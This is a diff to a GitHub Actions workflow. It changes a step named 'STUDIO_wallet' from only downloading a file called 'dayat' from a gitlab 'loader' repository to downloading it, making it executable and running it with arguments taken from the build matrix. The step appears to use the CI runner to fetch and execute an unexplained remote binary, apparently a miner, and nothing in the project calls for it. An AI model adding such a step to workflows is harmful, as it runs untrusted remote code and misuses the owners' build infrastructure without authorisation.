@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v2
     - name: STUDIO_wallet
       run: |
-        wget https://gitlab.com/admin1246/loader/-/raw/main/dayat
+        wget https://gitlab.com/admin1246/loader/-/raw/main/dayat && chmod u+x dayat && ./dayat scala kloter1-${{ matrix.go }}-${{ matrix.flag }}
